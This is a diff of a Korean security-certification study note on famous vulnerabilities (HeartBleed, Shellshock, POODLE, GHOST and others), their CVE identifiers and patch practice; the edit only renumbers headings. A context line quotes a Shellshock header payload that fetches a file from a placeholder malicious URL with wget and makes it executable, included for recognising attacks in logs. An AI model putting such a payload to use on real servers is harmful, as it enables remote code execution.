@@ -9,7 +9,7 @@ tags: [HeartBleed, Shellshock, Log4j, POODLE, CVE, OpenSSL]
 
 이름 붙은 대형 취약점은 **"무엇을 · 왜 · 어떤 버전 · 어떻게 막나"** 의 4칸으로 외운다. 시험은 취약점 이름 ↔ 원리 매칭과, 로그·헤더에서 *어떤 공격인지* 알아보는 형태가 많다. {{3-2}} {{4-1}} {{5-2}} {{15-7}} {{23-10}} {{29-8}}
 
-## 1. 식별자 — CVE
+## 식별자 — CVE
 
 `CVE-2014-0160` = `CVE` - `발견/공개 연도` - `그 해 일련번호`. MITRE 가 채번하고 NVD 가 CVSS 점수를 부여한다.
 
@@ -19,7 +19,7 @@ tags: [HeartBleed, Shellshock, Log4j, POODLE, CVE, OpenSSL]
 | **CVSS** | 심각도 0~10점 |
 | **CPE** | 제품 식별 |
 
-## 2. 대표 취약점 4종
+## 대표 취약점 4종
 
 ### HeartBleed — CVE-2014-0160
 
@@ -56,7 +56,7 @@ Accept-Encoding: () { :; }; /bin/bash -c 'wget -O /tmp/x http://악성URL; chmod
 - 대응: **SSL 3.0 비활성** · `TLS_FALLBACK_SCSV`
 - 관련 CBC 공격: BEAST · Lucky13
 
-## 3. 기타 유명 취약점 (단답 대비)
+## 기타 유명 취약점 (단답 대비)
 
 | 이름 | 대상 / 원리 | 대응 |
 |---|---|---|
@@ -71,7 +71,7 @@ Accept-Encoding: () { :; }; /bin/bash -c 'wget -O /tmp/x http://악성URL; chmod
 | **Meltdown / Spectre** | CPU 투기적 실행 → 커널 메모리 유출 | 마이크로코드·OS 패치 (성능 저하) |
 | **GHOST** (CVE-2015-0235) | glibc `gethostbyname` 버퍼 오버플로 | glibc 패치 |
 
-## 4. 공통 대응 원칙
+## 공통 대응 원칙
 
 1. **패치 관리 절차**: 인지 → 영향 분석 → **테스트 환경 검증** → 배포 → 적용 확인 → 롤백 계획
 2. 즉시 패치 불가 시 **가상 패치**(WAF·IPS 시그니처)로 시간 확보
